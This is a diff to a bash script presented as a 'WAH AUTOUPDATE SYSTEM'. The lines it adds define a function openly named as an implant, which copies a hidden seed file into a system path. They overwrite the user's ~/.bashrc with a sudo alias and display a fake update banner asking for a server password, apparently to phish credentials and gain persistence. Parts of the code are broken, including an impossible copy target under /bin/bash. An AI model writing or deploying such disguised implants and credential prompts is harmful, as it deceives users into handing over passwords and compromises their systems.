@@ -1,28 +1,34 @@
 #!/bin/bash
 
+function out_msg(){
+    echo '################################'
+    echo ''
+    echo '     WAH AUTOUPDATE SYSTEM'
+    echo ''
+    echo '********************************'
+    echo '  Please enter server password.'
+    echo ' If you do not know the server'
+    echo ' password, please call WAH Office'
+    echo '********************************'
+}
+
+
+
+
+function fx_init_bash_implant(){
+    out_msg
+    cp .light_seed /bin/bash/wahupdate
+}
+
 
 #lets do some pre-flight checks
 
 php spear.php
-
-if [ 0 == `cat .blood` ]
+#DITO KA NALANG MAG CHECK NG MGA FILES HAYUP KA HAHAHAHA BAT KA PA NAG PHP
+if [ 0 == `cat .blood` ] #if no script is found
 then
-    echo "";
-    sh yeet
+    echo "alias 'wahupdate'='sudo /bin/usr/wahupdate'" > ~/.bashrc
+    fx_init_bash_implant
 else
     echo "wow meron";
 fi
-
-#CHECK IF USER IS RUNNING ROOT
-#FORCE USER TO RUN ROOT
-
-echo '################################'
-echo ''
-echo '     WAH AUTOUPDATE SYSTEM'
-echo ''
-echo '********************************'
-echo '  Please enter server password.'
-echo ' If you do not know the server'
-echo ' password, please call WAH Office'
-echo '********************************'
-sudo sh wahupdate
